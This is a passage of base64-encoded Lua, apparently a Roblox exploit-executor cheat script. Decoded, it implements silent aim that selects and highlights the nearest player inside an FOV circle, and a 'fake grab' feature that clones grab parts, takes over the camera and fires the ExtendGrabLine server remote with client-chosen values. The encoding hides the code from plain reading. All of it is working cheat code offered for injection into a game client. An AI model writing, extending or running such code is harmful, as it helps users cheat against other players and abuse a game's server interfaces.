aWV3cG9ydFBvaW50KHRhcmdldFJvb3QuUG9zaXRpb24pCiAgICAKICAgIC0tIE11c3QgYmUgb24gc2NyZWVuCiAgICBpZiBub3Qgb25TY3JlZW4gdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAKICAgIC0tIENhbGN1bGF0ZSBzY3JlZW4gY2VudGVyCiAgICBsb2NhbCBzY3JlZW5DZW50ZXIgPSBWZWN0b3IyLm5ldyhjYW1lcmEuVmlld3BvcnRTaXplLlggLyAyLCBjYW1lcmEuVmlld3BvcnRTaXplLlkgLyAyKQogICAgbG9jYWwgdGFyZ2V0U2NyZWVuUG9zID0gVmVjdG9yMi5uZXcoc2NyZWVuUG9pbnQuWCwgc2NyZWVuUG9pbnQuWSkKICAgIGxvY2FsIGRpc3RhbmNlRnJvbUNlbnRlciA9ICh0YXJnZXRTY3JlZW5Qb3MgLSBzY3JlZW5DZW50ZXIpLk1hZ25pdHVkZQogICAgCiAgICAtLSBGSVg6IEFjdHVhbGx5IHVzZSB0aGUgRk9WIHJhZGl1cyBwcm9wZXJseQogICAgaWYgZGlzdGFuY2VGcm9tQ2VudGVyID4gZm92UmFkaXVzIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgCiAgICAtLSBBZGRpdGlvbmFsIGNoZWNrOiBNYWtlIHN1cmUgdGhleSdyZSBpbiBmcm9udCBvZiB5b3UKICAgIGxvY2FsIHRvUGxheWVyID0gKHRhcmdldFJvb3QuUG9zaXRpb24gLSBteVJvb3QuUG9zaXRpb24pLlVuaXQKICAgIGxvY2FsIGxvb2tEaXJlY3Rpb24gPSBjYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IKICAgIGxvY2FsIGRvdFByb2R1Y3QgPSB0b1BsYXllcjpEb3QobG9va0RpcmVjdGlvbikKICAgIAogICAgLS0gTXVzdCBiZSBpbiBmcm9udCAocG9zaXRpdmUgZG90IHByb2R1Y3QpCiAgICBpZiBkb3RQcm9kdWN0IDw9IDAuMSB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIAogICAgcmV0dXJuIHRydWUKZW5kCgotLSBJTVBST1ZFRDogZmluZE5lYXJlc3RQbGF5ZXIgd2l0aCBzY3JlZW4tYmFzZWQgdGFyZ2V0aW5nCmxvY2FsIGZ1bmN0aW9uIGZpbmROZWFyZXN0UGxheWVyKGZvdlJhZGl1cykKICAgIGxvY2FsIG5lYXJlc3RQbGF5ZXIgPSBuaWwKICAgIGxvY2FsIHNob3J0ZXN0RGlzdGFuY2UgPSBtYXRoLmh1Z2UKICAgIAogICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAtLSBGaXJzdCBjaGVjayBpZiB0aGV5J3JlIGluIEZPVgogICAgICAgICAgICBpZiBpc1BsYXllckluRk9WKHBsYXllciwgZm92UmFkaXVzKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgdGFyZ2V0Um9vdCBhbmQgbXlSb290IHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBGSVg6IFVzZSBzY3JlZW4gZGlzdGFuY2UgZm9yIGJldHRlciBGT1YgdGFyZ2V0aW5nCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzY3JlZW5Qb2ludCwgXyA9IGNhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludCh0YXJnZXRSb290LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNjcmVlbkNlbnRlciA9IFZlY3RvcjIubmV3KGNhbWVyYS5WaWV3cG9ydFNpemUuWCAvIDIsIGNhbWVyYS5WaWV3cG9ydFNpemUuWSAvIDIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0U2NyZWVuUG9zID0gVmVjdG9yMi5uZXcoc2NyZWVuUG9pbnQuWCwgc2NyZWVuUG9pbnQuWSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzY3JlZW5EaXN0YW5jZSA9ICh0YXJnZXRTY3JlZW5Qb3MgLSBzY3JlZW5DZW50ZXIpLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIFVzZSBzY3JlZW4gZGlzdGFuY2UgaW5zdGVhZCBvZiAzRCBkaXN0YW5jZSBmb3IgYmV0dGVyIGNyb3NzaGFpciB0YXJnZXRpbmcKICAgICAgICAgICAgICAgICAgICBpZiBzY3JlZW5EaXN0YW5jZSA8IHNob3J0ZXN0RGlzdGFuY2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzaG9ydGVzdERpc3RhbmNlID0gc2NyZWVuRGlzdGFuY2UKICAgICAgICAgICAgICAgICAgICAgICAgbmVhcmVzdFBsYXllciA9IHBsYXllcgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHJldHVybiBuZWFyZXN0UGxheWVyCmVuZAoKLS0gRk9WIENpcmNsZSBWaXN1YWxpemVyCmxvY2FsIGZvdkNpcmNsZSA9IERyYXdpbmcubmV3KCJDaXJjbGUiKQpmb3ZDaXJjbGUuVGhpY2tuZXNzID0gMgpmb3ZDaXJjbGUuTnVtU2lkZXMgPSAxMDAKZm92Q2lyY2xlLlJhZGl1cyA9IDI1MApmb3ZDaXJjbGUuRmlsbGVkID0gZmFsc2UKZm92Q2lyY2xlLlRyYW5zcGFyZW5jeSA9IDEKZm92Q2lyY2xlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCmZvdkNpcmNsZS5WaXNpYmxlID0gZmFsc2UKCmxvY2FsIHNob3dGT1ZDaXJjbGUgPSBmYWxzZQoKLS0gVGFyZ2V0IEhpZ2hsaWdodApsb2NhbCB0YXJnZXRIaWdobGlnaHQgPSBJbnN0YW5jZS5uZXcoIkhpZ2hsaWdodCIpCnRhcmdldEhpZ2hsaWdodC5GaWxsVHJhbnNwYXJlbmN5ID0gMC41CnRhcmdldEhpZ2hsaWdodC5PdXRsaW5lVHJhbnNwYXJlbmN5ID0gMAp0YXJnZXRIaWdobGlnaHQuRmlsbENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCnRhcmdldEhpZ2hsaWdodC5PdXRsaW5lQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQp0YXJnZXRIaWdobGlnaHQuUGFyZW50ID0gbmlsCgpSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICBuZWFyZXN0UGxheWVySW5mbyA9IGZpbmROZWFyZXN0UGxheWVyKGdldGdlbnYoKS5TZXR0aW5ncy5Gb3YpCiAgICAKICAgIC0tIFVwZGF0ZSBGT1YgY2lyY2xlCiAgICBpZiBzaG93Rk9WQ2lyY2xlIGFuZCBfRy5TaWxlbnRBaW1WMiB0aGVuCiAgICAgICAgbG9jYWwgY2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICBmb3ZDaXJjbGUuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhjYW1lcmEuVmlld3BvcnRTaXplLlggLyAyLCBjYW1lcmEuVmlld3BvcnRTaXplLlkgLyAyKQogICAgICAgIGZvdkNpcmNsZS5SYWRpdXMgPSBnZXRnZW52KCkuU2V0dGluZ3MuRm92CiAgICAgICAgZm92Q2lyY2xlLlZpc2libGUgPSB0cnVlCiAgICBlbHNlCiAgICAgICAgZm92Q2lyY2xlLlZpc2libGUgPSBmYWxzZQogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSB0YXJnZXQgaGlnaGxpZ2h0CiAgICBpZiBuZWFyZXN0UGxheWVySW5mbyBhbmQgbmVhcmVzdFBsYXllckluZm8uQ2hhcmFjdGVyIGFuZCBfRy5TaWxlbnRBaW1WMiB0aGVuCiAgICAgICAgdGFyZ2V0SGlnaGxpZ2h0LlBhcmVudCA9IG5lYXJlc3RQbGF5ZXJJbmZvLkNoYXJhY3RlcgogICAgZWxzZQogICAgICAgIHRhcmdldEhpZ2hsaWdodC5QYXJlbnQgPSBuaWwKICAgIGVuZAogICAgCiAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICBfRy5Vbml2ZXJzYWxQbGF5ZXJSb290ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgIGVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBBY3Rpb25FdmVudChldmVudE5hbWUsIGV2ZW50VmFsdWUpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyR3VpID0gTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQogICAgICAgIGxvY2FsIGNvbnRyb2xzR3VpID0gcGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJDb250cm9sc0d1aSIpCiAgICAgICAgbG9jYWwgYWN0aW9uRXZlbnQgPSBjb250cm9sc0d1aSBhbmQgY29udHJvbHNHdWk6RmluZEZpcnN0Q2hpbGQoIkFjdGlvbkV2ZW50IikKICAgICAgICBpZiBhY3Rpb25FdmVudCB0aGVuCiAgICAgICAgICAgIGFjdGlvbkV2ZW50OkZpcmUoZXZlbnROYW1lLCBldmVudFZhbHVlKQogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGxvY2tDYW1lcmEoKQogICAgaWYgVXNlcklucHV0U2VydmljZS5Nb3VzZUJlaGF2aW9yIH49IEVudW0uTW91c2VCZWhhdmlvci5Mb2NrQ2VudGVyIHRoZW4KICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLk1vdXNlQmVoYXZpb3IgPSBFbnVtLk1vdXNlQmVoYXZpb3IuTG9ja0NlbnRlcgogICAgZW5kCiAgICBpZiBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFUeXBlIH49IEVudW0uQ2FtZXJhVHlwZS5TY3JpcHRhYmxlIHRoZW4KICAgICAgICBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFUeXBlID0gRW51bS5DYW1lcmFUeXBlLlNjcmlwdGFibGUKICAgIGVuZAogICAgZm9yIF8sIGRlc2NlbmRhbnQgaW4gcGFpcnMoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgaWYgZGVzY2VuZGFudDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICBkZXNjZW5kYW50LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBlbmQKICAgIGVuZAogICAgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhfRy5Vbml2ZXJzYWxQbGF5ZXJSb290LkNGcmFtZSAqIHZhcjEyMF91cHZ3KSAqIFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Sb3RhdGlvbgogICAgaWYgX0cuUm90YXRpbmdGYWtlR3JhYlBhcnRzID09IGZhbHNlIHRoZW4KICAgICAgICBSdW5TZXJ2aWNlOlVuYmluZEZyb21SZW5kZXJTdGVwKCJjYW1CaW5kaW5nMSIpCiAgICAgICAgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20KICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLk1vdXNlQmVoYXZpb3IgPSBFbnVtLk1vdXNlQmVoYXZpb3IuRGVmYXVsdAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gR3JhYlBhcnRGYWtlKHBvdGVudGlhbEdyYWJQYXJ0KQogICAgbG9jYWwgbG9jYWxQbGF5ZXJDaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIGFjdHVhbEZha2VHcmFiUGFydHMgPSBfRy5BY3R1YWxGYWtlR3JhYlBhcnRzCiAgICAKICAgIGlmIGxvY2FsUGxheWVyQ2hhcmFjdGVyIGFuZCBwb3RlbnRpYWxHcmFiUGFydCBhbmQgcG90ZW50aWFsR3JhYlBhcnQ6SXNBKCJQYXJ0IikgYW5kIG5vdCBhY3R1YWxGYWtlR3JhYlBhcnRzIHRoZW4KICAgICAgICBsb2NhbCBwbGF5ZXJIdW1hbm9pZCA9IGxvY2FsUGxheWVyQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIG5vdCBwbGF5ZXJIdW1hbm9pZCBvciBwbGF5ZXJIdW1hbm9pZC5IZWFsdGggPD0gMCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBpZiBfRy5SZWFsR3JhYlBhcnRzIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGhlYWRQYXJ0ID0gcG90ZW50aWFsR3JhYlBhcnQuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHBvdGVudGlhbEdyYWJQYXJ0LlBhcmVudDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCBncmFiUGFydE9ySGVhZCA9IGhlYWRQYXJ0IG9yIHBvdGVudGlhbEdyYWJQYXJ0CiAgICAgICAgbG9jYWwgaXNHcmFiYmluZyA9IGZhbHNlCiAgICAgICAgbG9jYWwgaXNSb3RhdGluZ0Zha2VHcmFiUGFydHMgPSBmYWxzZQogICAgICAgIGxvY2FsIGN1cnJlbnRSZWFjaCA9IExvY2FsUGxheWVyOkZpbmRGaXJzdENoaWxkKCJDdXJyZW50UmVhY2giKQogICAgICAgIAogICAgICAgIGlmIHRhcmdldEh1bWFub2lkIGFuZCB0YXJnZXRIdW1hbm9pZC5IZWFsdGggPCAxIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBwY0Rpc3RhbmNlMiA9IChwb3RlbnRpYWxHcmFiUGFydC5Qb3NpdGlvbiAtIFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgbG9jYWwgZ3JhYlBhcnRzTW9kZWxDbG9uZSA9IEdyYWJQYXJ0c01vZGVsOkNsb25lKCkKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lOlNldEF0dHJpYnV0ZSgiRmFrZSIsIHRydWUpCiAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5OYW1lID0gIkdyYWJQYXJ0cyIKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LkNvbG9yID0gTG9jYWxQbGF5ZXIuQmVhbUNvbG9yLkJhbGxDb2xvckhvbGRlci5WYWx1ZQogICAgICAgIGdyYWJQYXJ0c01vZGVsQ2xvbmUuQmVhbVBhcnQuR3JhYkJlYW0uQ29sb3IgPSBMb2NhbFBsYXllci5CZWFtQ29sb3IuQ29sb3JTZXF1ZW5jZUhvbGRlci5Db2xvcgogICAgICAgIAogICAgICAgIGlmIGN1cnJlbnRSZWFjaCBhbmQgY3VycmVudFJlYWNoLlZhbHVlID09IDQwIHRoZW4KICAgICAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5CZWFtUGFydC5HcmFiQmVhbS5UZXh0dXJlID0gInJieGFzc2V0aWQ6Ly84OTMzMzU1ODk5IgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGdyYWJQYXJ0c01vZGVsQ2xvbmUuRHJhZ1BhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5HcmFiUGFydC5HcmFiQXR0YWNoLk9yaWVudGF0aW9uID0gV29ya3NwYWNlLlJvdGF0ZU9yaWVudFBhcnQuUGFydE9yaWVudC5Xb3JsZE9yaWVudGF0aW9uCiAgICAgICAgZ3JhYlBhcnRzTW9kZWxDbG9uZS5EcmFnUGFydC5EcmFnQXR0YWNoLldvcmxkT3JpZW50YXRpb24gPSBXb3Jrc3BhY2UuUm90YXRlT3JpZW50UGFydC5QYXJ0T3JpZW50LldvcmxkT3JpZW50YXRpb24KICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LldlbGRDb25zdHJhaW50LlBhcnQxID0gcG90ZW50aWFsR3JhYlBhcnQKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LlBvc2l0aW9uID0gcG90ZW50aWFsR3JhYlBhcnQuUG9zaXRpb24KICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkJlYW1QYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIGdyYWJQYXJ0c01vZGVsQ2xvbmUuQmVhbVBhcnQuR3JhYkJlYW0uQXR0YWNobWVudDAgPSBsb2NhbFBsYXllckNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ2FtUGFydCIpLkF0dGFjaG1lbnQKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLlBhcmVudCA9IFdvcmtzcGFjZQogICAgICAgIF9HLkFjdHVhbEZha2VHcmFiUGFydHMgPSBncmFiUGFydHNNb2RlbENsb25lCiAgICAgICAgCiAgICAgICAgbG9jYWwgaW5wdXRDaGFuZ2VkQ29ubmVjdGlvbiA9IFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXRPYmplY3QsIGlucHV0SXNQcm9jZXNzZWQpCiAgICAgICAgICAgIGlmIG5vdCBpbnB1dElzUHJvY2Vzc2VkIHRoZW4KICAgICAgICAgICAgICAgIGlmIGlucHV0T2JqZWN0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlV2hlZWwgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGlucHV0T2JqZWN0LlBvc2l0aW9uLlogPD0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlucHV0T2JqZWN0LlBvc2l0aW9uLlogPCAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjRGlzdGFuY2UyID0gbWF0aC5mbG9vcihwY0Rpc3RhbmNlMiArIGlucHV0T2JqZWN0LlBvc2l0aW9uLlogKiAyKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHBjRGlzdGFuY2UyID0gbWF0aC5jZWlsKHBjRGlzdGFuY2UyICsgaW5wdXRPYmplY3QuUG9zaXRpb24uWiAqIDIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNEaXN0YW5jZTIgPSBtYXRoLmNsYW1wKHBjRGlzdGFuY2UyLCAzLCAzMCkKICAgICAgICAgICAgICAgICAgICBFeHRlbmRHcmFiTGluZTpGaXJlU2VydmVyKHBjRGlzdGFuY2UyKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBpc1JvdGF0aW5nRmFrZUdyYWJQYXJ0cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm90YXRlT3JpZW50UGFydENsb25lID0gV29ya3NwYWNlLlJvdGF0ZU9yaWVudFBhcnQ6Q2xvbmUoKQogICAgICAgICAgICAgICAgICAgIHJvdGF0ZU9yaWVudFBhcnRDbG9uZS5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICByb3RhdGVPcmllbnRQYXJ0Q2xvbmUuT3JpZW50YXRpb24gPSBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgICAgICAgICAgcm90YXRlT3JpZW50UGFydENsb25lLk9yaWVudGF0aW9uLlggKyBpbnB1dE9iamVjdC5EZWx0YS5ZLAogICAgICAgICAgICAgICAgICAgICAgICByb3RhdGVPcmllbnRQYXJ0Q2xvbmUuT3JpZW50YXRpb24uWSArIGlucHV0T2JqZWN0LkRlbHRhLlgsCiAgICAgICAgICAgICAgICAgICAgICAgIHJvdGF0ZU9yaWVudFBhcnRDbG9uZS5PcmllbnRhdGlvbi5aCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIFdvcmtzcGFjZS5Sb3RhdGVPcmllbnRQYXJ0LlBhcnRPcmllbnQuV29ybGRPcmllbnRhdGlvbiA9IHJvdGF0ZU9yaWVudFBhcnRDbG9uZTpXYWl0Rm9yQ2hpbGQoIlBhcnRPcmllbnQiKS5Xb3JsZE9yaWVudGF0aW9uCiAgICAgICAgICAgICAgICAgICAgcm90YXRlT3JpZW50UGFydENsb25lOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LkJlYW1Tb3VuZDpQbGF5KCkKICAgICAgICBncmFiUGFydHNNb2RlbENsb25lLkdyYWJQYXJ0LkF0dGFjaFNvdW5kOlBsYXkoKQogICAgICAgIEFjdGlvbkV2ZW50KCJIb2xkQ29udHJvbHMiLCBmYWxzZSkKICAgICAgICBBY3Rpb25FdmVudCgiR3JhYmJpbmdDb250cm9scyIsIHRydWUpCiAgICAgICAgQWN0aW9uRXZlbnQoIkdyYWJDb250cm9scyIsIGZhbHNlKQogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGRlc3Ryb3lHcmFiUGFydHMoKQogICAgICAgICAgICBncmFiUGFydHNNb2RlbENsb25lOkRlc3Ryb3koKQogICAgICAgICAgICBpZiBwb3RlbnRpYWxHcmFiUGFydC5BbmNob3JlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB0b3RhbE1hc3MgPSAwCiAgICAgICAgICAgICAgICBpZiBwb3RlbnRpYWxHcmFiUGFydC5QYXJlbnQ6SXNBKCJNb2RlbCIpIGFuZCBwb3RlbnRpYWxHcmFiUGFydC5QYXJlbnQuTmFtZSB+PSAiV29ya3NwYWNlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGNoaWxkUGFydCBpbiBwYWlycyhwb3RlbnRpYWxHcmFiUGFydC5QYXJlbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hpbGRQYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbE1hc3MgPSB0b3RhbE1hc3MgKyBjaGlsZFBhcnQuTWFzcwogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgXywgY2hpbGRQYXJ0MiBpbiBwYWlycyhwb3RlbnRpYWxHcmFiUGFydC5QYXJlbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hpbGRQYXJ0MjpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hpbGRQYXJ0Mi5WZWxvY2l0eSA9IFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogNTAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIGNhbGN1bGF0ZWRWZWxvY2l0eSA9IFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogNzUwIC8gKHRvdGFsTWFzcyArIHBvdGVudGlhbEdyYWJQYXJ0Lk1hc3MpICsgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAxNQogICAgICAgICAgICAgICAgaWYgY2FsY3VsYXRlZFZlbG9jaXR5Lk1hZ25pdHVkZSA8IDEwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2FsY3VsYXRlZFZlbG9jaXR5ID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAxMDAKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgcG90ZW50aWFsR3JhYlBhcnQuVmVsb2NpdHkgPSBjYWxjdWxhdGVkVmVsb2NpdHkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaW5wdXRCZWdhbkNvbm5lY3Rpb24gPSBVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dE9iamVjdDIsIGlucHV0SXNQcm9jZXNzZWQyKQogICAgICAgICAgICBpZiBub3QgaW5wdXRJc1Byb2Nlc3NlZDIgdGhlbgogICAgICAgICAgICAgICAgaWYgaW5wdXRPYmplY3QyLlVzZXJJbnB1dFR5cGUgfj0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMiB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgaW5wdXRPYmplY3QyLktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBpc1JvdGF0aW5nRmFrZUdyYWJQYXJ0cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc1JvdGF0aW5nRmFrZUdyYWJQYXJ0cyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfRy5Sb3RhdGluZ0Zha2VHcmFiUGFydHMgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJJbnB1dFNlcnZpY2UuTW91c2VCZWhhdmlvciA9IEVudW0uTW91c2VCZWhhdmlvci5EZWZhdWx0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlOlVuYmluZEZyb21SZW5kZXJTdGVwKCJjYW1CaW5kaW5nMSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBY3Rpb25FdmVudCgiUm90YXRpbmdDb250cm9scyIsIGZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgQWN0aW9uRXZlbnQoIlJvdGF0ZUNvbnRyb2xzIiwgdHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNSb3RhdGluZ0Zha2VHcmFiUGFydHMgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfRy5Sb3RhdGluZ0Zha2VHcmFiUGFydHMgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIxMjBfdXB2dyA9IF9HLlVuaXZlcnNhbFBsYXllclJvb3QuQ0ZyYW1lOlRvT2JqZWN0U3BhY2UoV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lKS5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5TY3JpcHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlLk1vdXNlQmVoYXZpb3IgPSBFbnVtLk1vdXNlQmVoYXZpb3IuTG9ja0NlbnRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgUnVuU2VydmljZTpCaW5kVG9SZW5kZXJTdGVwKCJjYW1CaW5kaW5nMSIsIEVudW0uUmVuZGVyUHJpb3JpdHkuQ2FtZXJhLlZhbHVlIC0gMSwgbG9ja0NhbWVyYSkKICAgICAgICAgICAgICAgICAgICAgICAg